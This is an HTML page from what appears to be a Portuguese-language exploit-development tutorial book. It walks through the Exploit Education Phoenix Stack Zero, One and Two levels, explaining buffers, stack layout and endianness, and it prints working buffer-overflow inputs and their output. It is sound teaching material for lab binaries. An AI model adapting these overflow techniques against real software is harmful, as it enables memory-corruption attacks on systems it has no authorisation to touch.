<!DOCTYPE HTML>
<html lang="pt-br" class="sidebar-visible no-js ayu">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Um Livrinho Sobre Exploit Dev</title>
        
        <meta name="robots" content="noindex" />
        
        


        <!-- Custom HTML head -->
        


        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        
        <link rel="icon" href="favicon.svg">
        
        
        <link rel="shortcut icon" href="favicon.png">
        
        <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
        
        <link rel="stylesheet" href="css/print.css" media="print">
        

        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
        
        <link rel="stylesheet" href="fonts/fonts.css">
        

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->
        

        
    </head>
    <body>
        <!-- Provide site root to javascript -->
        <script type="text/javascript">
            var path_to_root = "";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "ayu";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script type="text/javascript">
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('ayu')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var html = document.querySelector('html');
            var sidebar = 'hidden';
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="spacer"></li><li class="chapter-item "><a href="intro.html">Intro</a><a class="toggle"><div>‚ù±</div></a></li><li><ol class="section"><li class="chapter-item "><a href="aventura.html">Aventura</a></li></ol></li><li class="chapter-item "><li class="part-title">Stack</li><li class="spacer"></li><li class="chapter-item "><a href="stack/phoenix/setup.html">Phoenix Stack</a><a class="toggle"><div>‚ù±</div></a></li><li><ol class="section"><li class="chapter-item "><a href="stack/phoenix/StackZero.html">Stack Zero</a></li><li class="chapter-item "><a href="stack/phoenix/StackOne.html">Stack One</a></li><li class="chapter-item "><a href="stack/phoenix/StackTwo.html">Stack Two</a></li><li class="chapter-item "><a href="stack/phoenix/StackThree.html">Stack Three</a></li><li class="chapter-item "><a href="stack/phoenix/StackFour.html">Stack Four</a></li><li class="chapter-item "><a href="stack/phoenix/StackFive.html">Stack Five</a></li><li class="chapter-item "><a href="stack/phoenix/StackSix.html">Stack Six</a></li></ol></li><li class="chapter-item "><a href="stack/mitigacoes.html">Mitiga√ß√µes</a></li><li class="chapter-item "><div>Ret2LibC</div><a class="toggle"><div>‚ù±</div></a></li><li><ol class="section"><li class="chapter-item "><div>Pratica</div><a class="toggle"><div>‚ù±</div></a></li><li><ol class="section"><li class="chapter-item "><div>Protostar Stack Six</div></li></ol></li><li class="chapter-item "><div>Avan√ßado: Multiplos ret2libc</div></li></ol></li><li class="chapter-item "><div>Estilo OSCP</div><a class="toggle"><div>‚ù±</div></a></li><li><ol class="section"><li class="chapter-item "><div>Brainpan</div></li><li class="chapter-item "><div>Tib3rius BOF Prep</div></li></ol></li><li class="chapter-item "><div>ROP</div><a class="toggle"><div>‚ù±</div></a></li><li><ol class="section"><li class="chapter-item "><div>Ferramentas</div></li><li class="chapter-item "><div>64vs32 Bit</div></li></ol></li><li class="chapter-item "><div>Derrotando ASLR</div></li><li class="chapter-item "><div>Derrotando Canaries</div></li><li class="chapter-item affix "><li class="part-title">Format Strings</li><li class="spacer"></li><li class="chapter-item "><div>Phoenix: Format</div></li><li class="chapter-item affix "><li class="part-title">Heap</li><li class="spacer"></li><li class="chapter-item "><div>Shellphish: How2Heap</div></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky bordered">
                    <div class="left-buttons">
                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </button>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu (default)</button></li>
                        </ul>
                        
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                        
                    </div>

                    <h1 class="menu-title">Um Livrinho Sobre Exploit Dev</h1>

                    <div class="right-buttons">
                        
                        <a href="print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>
                        
                        
                        <a href="https://github.com/0xturazzi/Um-Livrinho-Sobre-Exploit-Dev/" title="Git repository" aria-label="Git repository">
                            <i id="git-repository-button" class="fa fa-github"></i>
                        </a>
                        
                    </div>
                </div>

                
                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" name="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>
                

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script type="text/javascript">
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <p>Hey, tudo bem? :)</p>
<p>Esse √© um livrinho que eu coloco coisas sobre desenvolvimento de exploit e AppSec!</p>
<p>E ele √© a minha tentativa de devolver para a comunidade! Eu percebi que n√£o existia muito conte√∫do em portugues, ent√£o resolvi fazer :D... j√° que essa √© uma area que voc√™ PRECISA de comunidade!</p>
<p>Voc√™ n√£o pode se sustentar nos ombros de gigantes, pq n√£o existem gigantes! \ O conhecimento vem de um milh√£o de mini-blogs aonde voc√™ vai aprender um milh√£o de mini-truques! E esse √© o meu :D</p>
<p>Caso voc√™ encontre um erro tecnico ou tenha uma sugest√£o, por favor abre uma issue no github :)</p>
<p>Creditos pelas imagens e fontes est√£o nas pastas de cada t√≥pico!</p>
<p>Na parte &quot;Aventura&quot; tem um mapa para te ajudar a navegar esse mundo! Boa sorte :D</p>
<h1><a class="header" href="#aventura" id="aventura">Aventura</a></h1>
<p>Isso nao ta pronto aaaaaaa foi mal :(</p>
<pre><code>  Stack Intro: Phoenix
        |
     ___|__________ ________  
    |              |        |
    V              V        V
  Format       O resto     Fuzzing
  Strings      da Stack
                   |
               ____|__
              |       | 
              V       V
           Windows   Heap
            |        Intro
    ________|      ____|______________
   |        |     |    |              |
   V        |     |    |              |
   Win      V     |    V              V
 File Sys  Win    |    Heap         Linux
           Stack  |    Avancado     Kernel
            |     | 
            |__ __|
               |
               V
              Win
              Heap  
</code></pre>
<p>Opa, tudo bom?</p>
<p>Tutorialzinho pq n√£o achei nenhum em portugues D:</p>
<p>Se encontrar algum erro, abre uma issue pf :)</p>
<p><strong>Link pros desafios: <a href="https://exploit.education/phoenix/">Exploit Education Phoenix</a></strong> </p>
<p>Eu ainda n√£o postei tudo, mas quando tiver tempo eu posto :D</p>
<p>Se quiser um bom em ingles:</p>
<p><a href="https://blog.lamarranet.com/index.php/exploit-education-phoenix-stack-zero-solution/">lamarranet</a></p>
<p><a href="https://youtu.be/Y-4WHf0of6Y">Live Overflow (Mas √© sobre o antigo: Protostar)</a></p>
<p>Status</p>
<ul>
<li><input disabled="" type="checkbox" checked=""/>
Stack</li>
<li><input disabled="" type="checkbox"/>
Format</li>
<li><input disabled="" type="checkbox"/>
Heap</li>
<li><input disabled="" type="checkbox"/>
Net</li>
<li><input disabled="" type="checkbox"/>
Final</li>
</ul>
<h1><a class="header" href="#-prerequisitos" id="-prerequisitos">üñ•Ô∏è Prerequisitos:</a></h1>
<ul>
<li>Saber alguma linguagem de programa√ß√£o e conceitos relacionados</li>
</ul>
<h1><a class="header" href="#-opcional-mas-util-saber" id="-opcional-mas-util-saber">üêß Opcional mas util saber</a></h1>
<ul>
<li>üíæ Um pouco de C / C++ / Rust / Linguagem de n√≠vel baixo</li>
<li>üêç Alguma linguagem de scripting: Python, Ruby, .....</li>
<li>üêß Saber o basico de Linux</li>
</ul>
<h1><a class="header" href="#-setup" id="-setup">ü§ñ Setup:</a></h1>
<ul>
<li>Baixar kali linux usando VM-Ware ou Virtual Box</li>
<li>Baixar Qemu na VM: <code>sudo apt-get install qemu</code></li>
<li>Baixar a imagem QCOW2 (eu usei AMD64): <a href="https://exploit.education/downloads/">Downloads Exploit Education</a></li>
<li>Na maquina kali executar:</li>
</ul>
<pre><code class="language-bash">$ cd ~/Downloads/exploit-education-phoenix-amd64
$ chmod +x boot-exploit-education-phoenix-amd64.sh
$ ./boot-exploit-education-phoenix-amd64.sh
</code></pre>
<ul>
<li><strong>N√ÇO USAR O CONSOLE BUGADO QUE APARECE !!!</strong> Miniza e esquece que ele existe!</li>
<li>Usa: ssh -p 2222 user@localhost # Os usuarios/senha s√£o: user/user e root/root</li>
<li>Os arquivos t√£o em: cd /opt/phoenix/amd64</li>
</ul>
<p>Boa Sorte! :D</p>
<h1><a class="header" href="#-descri√ß√£o" id="-descri√ß√£o">üìù Descri√ß√£o</a></h1>
<p>Esse nivel demonstra que memoria pode ser acessada fora da sua regi√£o 
inicialmente alocada, como as variaveis s√£o alocadas na stack, e que altera-las pode mudar a execu√ß√£o do programa.</p>
<p>Objetivo: Alterar a variavel &quot;changeme&quot;</p>
<h1><a class="header" href="#-dica" id="-dica">üí° Dica</a></h1>
<pre><code class="language-bash">$ python3 -c &quot;print('A' * 10)&quot;
AAAAAAAAAA

$ python3 -c &quot;print('A' * 10)&quot; | ./stack-zero 
</code></pre>
<h1><a class="header" href="#conhecimento-preliminar" id="conhecimento-preliminar">Conhecimento Preliminar</a></h1>
<h2><a class="header" href="#buffer" id="buffer">Buffer</a></h2>
<p>Buffers s√£o similares a arrays em outras linguagens de programa√ß√£o,
mas possuem tamanho fixo!</p>
<p>Eles s√£o definidos usando: <code>tipo nome[tamanho]</code> </p>
<p>O <code>tipo</code>, √© do que esta sendo armazenado dentro, por exemplo:</p>
<pre><code class="language-C">char buf[64]; // Armazena 64 caracteres
int buf[32];  // Armazena 32 ints
</code></pre>
<p>Esses buffers por possuirem tamanho fixo, s√£o armazenados na stack!</p>
<h2><a class="header" href="#stack" id="stack">Stack</a></h2>
<p>A stack √© uma por√ß√£o da memoria que armazena como se fosse uma pilha de pratos:</p>
<pre><code>Quando voc√™ quer colocar um novo, voc√™ coloca no topo da pilha (push)
Qando voc√™ quer pegar um da pilha, voc√™ pega o do topo (pop)

O ultimo a entrar, √© o primeiro a sair...
o nome desse comportamento √© LIFO (Last in First Out)
</code></pre>
<p><img src="stack/phoenix/./img/push-pop.png" alt="Imagem da wikipedia mostrando PUSH e POP" /></p>
<h3><a class="header" href="#a-stack-cresce-para-valores-menores" id="a-stack-cresce-para-valores-menores">A stack cresce para valores menores</a></h3>
<pre><code>Imagina que ela √© um po√ßo que come√ßa na profundidade 15

Quando voc√™ coloca um objeto de tamanho 2 no po√ßo:
ele vai estar apoiado na profundidade 15, e vai at√© a profundidade 13

Em seguida, voc√™ coloca algo de tamanho 3:
vai estar apoiado na profundidade 13, e vai at√© a profundidade 10
</code></pre>
<p>Conforme voc√™ vai <strong>adicionando</strong> itens, o endere√ßo que eles est√£o vai <strong>diminuindo</strong> em valor.
√â meio confuso, mas com o tempo voc√™ pega o jeito.</p>
<p>Pra complicar um pouco mais, esses endere√ßos t√£o em hexadecimal (0x0 ate 0xF, o &quot;0x&quot; √© pra representar que o valor t√° em hex).</p>
<h3><a class="header" href="#hex" id="hex">Hex</a></h3>
<p>Se vc n√£o souber hex: <a href="https://pt.wikipedia.org/wiki/Sistema_de_numera%C3%A7%C3%A3o_hexadecimal">Wikipedia Sistema de numera√ß√£o hexadecimal</a>
. Mas resumindo, em hex voc√™ conta:</p>
<pre><code>Hex: 0,1,2,...,8,9,A ,B ,C ,D ,E ,F ,10,11,12,...,19,1A,1B,1C,...,FF
Dec: 0,1,2,...,8,9,10,11,12,13,14,15,16,17,18,...,25,26,27,28,...,127
</code></pre>
<p>Ent√£o a base da stack √© 0xFFFFFFFF e o topo 0X00000000 !</p>
<h3><a class="header" href="#melhorando-o-exemplo-do-po√ßo" id="melhorando-o-exemplo-do-po√ßo">Melhorando o exemplo do po√ßo</a></h3>
<pre><code>0x0- 	     Topo da stack/Topo do po√ßo
0xA ate 0x1- espa√ßo vazio
0xD-         Segundo item
0xF-         Base da stack/Fundo do po√ßo, primeiro item
</code></pre>
<h1><a class="header" href="#-explica√ß√£o" id="-explica√ß√£o">üéâ Explica√ß√£o</a></h1>
<p>A fun√ß√£o main() pode estar sendo divida em 3 Partes:</p>
<ol>
<li>ü•û Alocando as variaveis na stack (buffer[64], changeme)</li>
<li>üí• Alterar buffer[64] usando gets()</li>
<li>‚úÖ Checando se changeme foi alterada</li>
</ol>
<pre><code class="language-C">int main(int argc, char **argv) {
			// Definir variaveis locais
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  printf(&quot;%s\n&quot;, BANNER); // Printar o banner (todo nivel faz isso)

  locals.changeme = 0;
  gets(locals.buffer);   // Alterar o buffer

  if (locals.changeme != 0) { 	// Checar se changeme foi alterada
    puts(&quot;Well done, the 'changeme' variable has been changed!&quot;);
  } else {
    puts(&quot;Uh oh, 'changeme' has not yet been changed&quot;);
  }

  exit(0);
}
</code></pre>
<p>Ue, <code>changeme</code> nunca foi alterada... Ela n√£o deveria estar mudando!</p>
<p>Calma que voc√™ ja vai enteder :)</p>
<h2><a class="header" href="#-1--alocando-as-variaveis-na-stack-buffer64-changeme" id="-1--alocando-as-variaveis-na-stack-buffer64-changeme">ü•û 1- Alocando as variaveis na stack (buffer[64], changeme)</a></h2>
<p>A variavel <code>buffer[64]</code> tem  tamanho de 64 bytes (64 letras, assumindo ASCII, um byte por letra).</p>
<p>A variavel <code>changeme</code> esta marcada como <code>vol√°til</code> para previnir que o compilador
destrua ela (pq originalmente n√£o seria
alterada, ent√£o seria destruida para otimizar o c√≥digo... 
Mas n√≥s vamos alterar ela por metodos... ~risada malefica~ ... n√£o convencionais hehehe).</p>
<p>Nossas duas variaveis (buffer[64] e changeme) s√£o empurradas na stack.</p>
<pre><code>buffer[64] (preenchido com zeros (vazio))
changeme   (com o valor: 0x00)
ret        - Base dessa stack
</code></pre>
<h2><a class="header" href="#-2--alterar-buffer64-usando-gets" id="-2--alterar-buffer64-usando-gets">üí• 2- Alterar buffer[64] usando gets</a></h2>
<p>A fun√ß√£o <code>gets()</code> abre um input no terminal, e escreve o que recebeu no <code>buffer</code>.</p>
<p>O problema √© que ela <strong>n√£o</strong> checa se o valor recebido √© maior que o <code>buffer</code>, permitindo que 
voc√™ <strong>escreva fora do buffer!!</strong> D:</p>
<p>Ela vai come√ßar a escrever no topo do buffer (menor endere√ßo)
e vai descendo at√© a base da stack.</p>
<pre><code>**Stack**
buffer
       [
A           | Gets escreve nesse sentido
A           |
A           \/
...
A
      ]
changeme (com valor 0x00)
ret       - Base dessa stack
</code></pre>
<p>Ent√£o, caso colocassemos 100 &quot;A&quot;s no buffer de tamanho 64, as variaveis nos proximos 36 endere√ßos seriam alteradas.</p>
<p>Essas variaveis ficariam com o valor &quot;41&quot;, mas pq 41?</p>
<p>O valor ASCII do &quot;A&quot; √© 0x41, voc√™ pode checar o de todas letras usando:</p>
<blockquote>
<p>$ man ascii</p>
</blockquote>
<p>Ui, o usuario pode escrever fora memoria dele? perigoso ne! D:</p>
<p>√â por isso que essa fun√ß√£o est√° marcada como <em>Deprecated</em> (fora de uso).</p>
<p>No nosso caso, o buffer tem o tamanho de <strong>64</strong> bytes, se colocarmos <strong>65</strong> &quot;A&quot;s (65 bytes), o valor vai vazar desse buffer.
Isso quer dizer que antes a variavel <code>changeme</code> tinha o valor <strong>0x00</strong> e agora tem o valor <strong>0x41</strong> !</p>
<pre><code>**Stack**
buffer
      [
41           | Gets escreve nesse sentido
41           |
41           \/
...
41
      ]
changeme (com o valor: 41)
ret       - Base dessa stack
</code></pre>
<h2><a class="header" href="#-3--o-programa-checa-se-changeme-foi-alterada" id="-3--o-programa-checa-se-changeme-foi-alterada">‚úÖ 3- O programa checa se changeme foi alterada</a></h2>
<p>Se foi alterada, quer dizer que a gente <em>overflow-ou</em> (escreveu fora) do buffer, √© vitoria!!! :D</p>
<p>Ta, mas como a gente faz isso na pr√°tica?</p>
<p><code>python3 -c &quot;print(&quot;A&quot;*65)&quot;</code> printa 65 &quot;A&quot;s para o terminal</p>
<p>Ent√£o se a gente encaminhar esses &quot;A&quot;s pro programa....</p>
<pre><code>Se voc√™ quer tentar resolver sozinhe, agora √© a sua hora!

.
.
.
.
</code></pre>
<h3><a class="header" href="#-64-as-changeme-n√£o-alterado" id="-64-as-changeme-n√£o-alterado">‚ùå 64 As, changeme n√£o alterado</a></h3>
<pre><code class="language-bash">$ python3 -c &quot;print('A' * 64)&quot; | ./stack-zero 
Banner
Uh oh, 'changeme' has not yet been changed.
Would you like to try again?
</code></pre>
<h3><a class="header" href="#-65-as-changeme-alterado" id="-65-as-changeme-alterado">‚úÖ 65 As, changeme alterado</a></h3>
<pre><code class="language-bash">$ python3 -c &quot;print('A' * 65)&quot; | ./stack-zero 
Banner
Well done, the 'changeme' variable has been changed!
</code></pre>
<h3><a class="header" href="#üÖ±-64-as-e-um-b-0x42-aaaaaaaaaaaab" id="üÖ±-64-as-e-um-b-0x42-aaaaaaaaaaaab">üÖ±Ô∏è 64 As e um B (0x42): AAAAAAAAA.....AAAB</a></h3>
<p>Para demonstrar melhor esse comportamento do buffer 
ser escrito em um sentido espec√≠fico (pq vai ser muito importante saber disso),
vou dar outro exemplo:
<code>python3 -c &quot;print('A' * 64 + 'B')&quot;</code> </p>
<pre><code class="language-md">buffer [
41           | Gets escreve nesse sentido
41           |
41           \/
...
41
       ]
changeme (com o valor: 42)   &lt;- B = 42!!!!
ret       - Base dessa stack
</code></pre>
<p>Os <code>A</code>s preenchem certinho a stack, e a gente pode colocar o valor que quiser na variavel!! Uhhuuu :D</p>
<p>Esses As s√≥ pra encher a stack s√£o chamados de <code>padding</code> (traduz pra preenchimento).</p>
<hr />
<p>Fim! :D</p>
<p>Ouch... isso foi um bocado de explica√ß√£o, mas relaxa que daqui pra frente fica mais dificil hehehe :D</p>
<p>Se voc√™ chegou at√© aqui, voc√™ ta de parabens !!!</p>
<p>Pra lembrar bem, desenha uma stack no papel, da um push nas variaveis e no buffer, mostra o sentido que o 
buffer escreve, e ele vazando e mudando o valor das outras variaveis...</p>
<h1><a class="header" href="#-solu√ß√£o" id="-solu√ß√£o">üëæ Solu√ß√£o</a></h1>
<pre><code class="language-bash">$ python3 -c &quot;print('A' * 65)&quot; | ./stack-zero
Welcome to phoenix/stack-zero, brought to you 
by https://exploit.education
Well done, the 'changeme' variable has been changed!
</code></pre>
<h1><a class="header" href="#-objetivo" id="-objetivo">üéØ Objetivo</a></h1>
<p>Agora o objetivo n√£o √© s√≥ alterar <code>changeme</code>, √© alterar para um valor especifico!</p>
<p>Lembra aquilo de controlar o valor depois do preenchimento (<code>padding</code>) ?</p>
<p>Pois √©, ele vai ser super util agora!</p>
<h1><a class="header" href="#-dicas" id="-dicas">üí° Dicas</a></h1>
<p>Ver a representa√ß√£o hex de cada letra:</p>
<blockquote>
<p>$ man ascii</p>
</blockquote>
<p>Dar um Google sobre Endianess.</p>
<h1><a class="header" href="#-explica√ß√£o-1" id="-explica√ß√£o-1">üí´ Explica√ß√£o</a></h1>
<p>Se lembra de que no tutorial passado a gente trocou <code>changeme</code> pra <strong>41</strong> e <strong>42</strong>?</p>
<p>O que ta acontecendo por tras das cenas √© que as letras est√£o virando a sua representa√ß√£o hex.</p>
<p>Ent√£o <code>print(&quot;A&quot;*5)</code> √© equivalente √† <code>print(b&quot;\x41&quot;*5)</code></p>
<blockquote>
<p>Presta aten√ß√£o no b&quot;&quot; : esse b indica que s√£o Bytes! :D</p>
</blockquote>
<p>As vezes o python3 vai reclamar de voc√™ usar valores arbitr√°rios pra esses bytes,
ent√£o voc√™ pode usar o python2 (o print n√£o tem parenteses, mas o resto √© igual):</p>
<blockquote>
<p>$ python -c &quot;print 'blablabla'&quot;</p>
</blockquote>
<p>Nesse caso, changeme ta sendo comparada com <strong>0x496c5962</strong></p>
<pre><code class="language-C">  if (locals.changeme == 0x496c5962) {
    puts(&quot;Well done, you have successfully set changeme 
				to the correct value&quot;);
</code></pre>
<p>O buffer tem tamanho 64 de novo, ent√£o podemos usar 64 caracteres para preenche-lo, igual na anterior! uhuuuu :D</p>
<h2><a class="header" href="#input" id="input">Input</a></h2>
<p>Nesse caso, o programa n√£o ta usando o gets pra abrir um input.</p>
<p>Ele ta usando o <code>argv</code> (o que vem depois do nome do programa quando
voc√™ executa no terminal)</p>
<blockquote>
<p>./stack-one teste batata</p>
</blockquote>
<pre><code>agrv[0] = stack-one (o nome do programa)
argv[1] = teste
argv[2] = batata
... e assim por diante
</code></pre>
<blockquote>
<p>argc √© a contagem: quantas coisas tem no argv! E aqui t√° checando se √© menor que 2!</p>
</blockquote>
<p>ent√£o no nosso caso, para mandar o input do python para o agrv vai funcionar assim:</p>
<blockquote>
<p>$ ./stack-one $(python -c &quot;print b'A' * 64&quot;)
o <code>$()</code> executa o comando dentro dos parenteses e usa o valor retornado como input do outro!</p>
</blockquote>
<p>ent√£o <code>$(python....)</code> vai executar, e em seguida:</p>
<blockquote>
<p>./stack-one AAAAAAAAAAAAAA...</p>
</blockquote>
<h2><a class="header" href="#endian" id="endian">Endian</a></h2>
<p>O valor de changeme tem tamanho 4 bytes, pq ele √© um integer (integers s√£o 32 ou 64 bits, ent√£o 4 ou 8 bytes). Isso quer dizer que a gente pode colocar 4 letras :D</p>
<pre><code>./stack-one $(python -c &quot;print b'A' * 64 + 'BCDE'&quot;)
Welcome to phoenix/stack-one, brought to you by exploit.education
Getting closer! changeme is currently 0x45444342, we want 0x496c5962
</code></pre>
<p>O programa nos diz o valor de <code>changeme</code>, que nos alteramos por ter <strong>overflow-ado</strong> o buffer</p>
<p>Ue, que esquisito, vc reparou algo de estranho?</p>
<p>A gente mandou <code>BCDE (42 43 44 45)</code> e ele colocou <code>EDCB (45 44 43 42)</code>, por que isso?</p>
<p>Os computadores armazenam integers usando um sistema Little Endian (LE) ou Big Endian (BE), esses sistemas decidem como os numeros s√£o representados.</p>
<blockquote>
<p>Esses sistemas se referem a magnitude dos digitos, Centena, Dezena, Unidade,...</p>
</blockquote>
<blockquote>
<p>Em um sistema BE, os numeros s√£o representados em ordem descrescente CDU.</p>
</blockquote>
<blockquote>
<p>Em um sistema LE, os numeros s√£o representados em ordem crescente UDC.</p>
</blockquote>
<pre><code>Por exemplo, o numero cento e vinte tr√™s:
BE: 123        
LE: 321
</code></pre>
<p>No dia a dia, nos humanos usamos o sistema BE, mas os computadores preferem LE, ent√£o eles invertem a ordem dos 4 bytes nos numeros inteiros!</p>
<p>Ent√£o pra gente conseguir que changeme seja <code>BCDE</code>, a gente precisa passar <code>EDCB</code> pro computador! :D</p>
<pre><code>$ ./stack-one $(python -c &quot;print b'A' * 64 + 'EDCB'&quot;)
Welcome to phoenix/stack-one, brought to you by exploit.education
Getting closer! changeme is currently 0x42434445, we want 0x496c5962
</code></pre>
<p>Isso quer dizer que pra gente definir <code>changeme = 49 6c 59 62</code>, e completar
o desafio, a gente precisa inverter a ordem dos bytes (<code>62 59 6c 49</code>)! :D</p>
<p>Mas eu n√£o sei que letras s√£o equivalentes a esses numeros... e nem todo numero tem uma letra!</p>
<h3><a class="header" href="#-dica-usando-valores-hex-diretamente" id="-dica-usando-valores-hex-diretamente">üåô Dica: Usando valores hex diretamente</a></h3>
<p>Lembra que eu falei que letras s√£o valores hex? A gente tambem pode usar os valores hex diretamente usando \x  :D</p>
<blockquote>
<p>Ent√£o usar b&quot;\x41&quot; √© igual a b&quot;A&quot;!</p>
</blockquote>
<pre><code>$ ./stack-one $(python -c &quot;print b'A' * 64 + b'\x62\x59\x6c\x49'&quot;)
Welcome to phoenix/stack-one, brought to you by exploit.education
Well done, you have successfully set changeme to the correct value
</code></pre>
<p>Yay vitoria! </p>
<p>Caso voc√™ queira usar as letras, voce pode tambem!</p>
<p>Ent√£o <code>b'\x62\x59\x6c\x49'</code> √© equivalente a <code>b'bYlI'</code></p>
<pre><code>$ ./stack-one $(python -c &quot;print b'A' * 64 + b'bYlI'&quot;)
Welcome to phoenix/stack-one, brought to you by exploit.education
Well done, you have successfully set changeme to the correct value
</code></pre>
<p>Mas e nos casos que o byte n√£o tem um correspondente v√°lido? Vc usa <code>&quot;\x&quot;</code> :D</p>
<p>Na verdade, √© mais pr√°tico usar <code>\x</code> 99% das vezes, ent√£o vale a pena criar o habito!</p>
<h1><a class="header" href="#-solu√ß√£o-1" id="-solu√ß√£o-1">üî• Solu√ß√£o</a></h1>
<blockquote>
<p>./stack-one $(python -c &quot;print b'A' * 64 + b'bYlI'&quot;)</p>
</blockquote>
<h1><a class="header" href="#-objetivo-1" id="-objetivo-1">üéØ Objetivo</a></h1>
<p>Similar √† anterior, a gente precisa mudar o valor da variavel changeme,
mas dessa vez ao inves de usar o input ou agrv, vamos usar env!</p>
<h1><a class="header" href="#-explica√ß√£o-2" id="-explica√ß√£o-2">üí´ Explica√ß√£o</a></h1>
<p>Nesse desafio, o programa usa getenv(&quot;ExploitEducation&quot;) para ler uma
enviroment variable. </p>
<h2><a class="header" href="#-environment-variable-vari√°vel-do-ambiente" id="-environment-variable-vari√°vel-do-ambiente">üå≥ Environment Variable (Vari√°vel do ambiente)</a></h2>
<p>Essas variaveis s√£o acessiveis para todos os programas
executando naquela se√ß√£o. E normalmente contem preferencias como cores, o tipo de terminal, etcetc....</p>
<p>Voc√™ pode checa-las usando</p>
<blockquote>
<p>$ env</p>
</blockquote>
<p>Voc√™ pode definir uma at√© o resto da se√ß√£o</p>
<blockquote>
<p>$ export Nome=Valor</p>
</blockquote>
<p>Voc√™ pode definir uma somente para execu√ß√£o daquele programa</p>
<blockquote>
<p>$ Nome=Valor ./stack-two</p>
</blockquote>
<p>Para n√≥s, n√£o faz tanta diferen√ßa se o input √© pelas <code>envs</code> ou por outro metodo.</p>
<p>O unico problema √© que n√£o podemos usar o Null Byte (0x00), pois ele √© usado para indicar o final de uma string ASCII, portanto terminando nossa variavel precocemente.</p>
<h2><a class="header" href="#overflow" id="overflow">Overflow</a></h2>
<p>Em seguida, o valor √© copiado para um <code>buffer[64]</code> usando: <code>strcpy(buffer, ptr)</code>. Com <code>ptr</code> sendo o valor da <code>env</code> 'ExploitEducation'.</p>
<p>A fun√ß√£o <code>strcpy</code>, assim como <code>gets</code>, n√£o checa se o valor √© maior que o buffer, tornando o programa vulner√°vel... :(</p>
<p>Por ultimo, o programa checa se <code>changeme == 0x0d0a090a</code></p>
<blockquote>
<p>Levando em considera√ß√£o que o sistema √© LE: 0a 09 0a 0d</p>
</blockquote>
<p>Mas pera ai, checando o manual ASCII, esses caracteres s√£o usados para encerrar linha, n√£o √© uma letra do teclado! D:</p>
<p>Pois √©, ent√£o vamos precisar usar os bytes diretamente.</p>
<pre><code>Se voc√™ quer tentar resolver sozinhe, agora √© a sua hora!

.
.
.
.
.
.
.
.
.
.
.
.
.
</code></pre>
<p>Eu precisei colocar em caixinhas diferentes para caber na tela :(</p>
<blockquote>
<p>$ ExploitEducation=$(python -c &quot;print b'A'*64 + b'\x0a\x09\x0a\x0d'&quot;) ./stack-two </p>
</blockquote>
<pre><code>Welcome to phoenix/stack-two, brought to you by exploit.education
Well done, you have successfully set changeme to the correct value
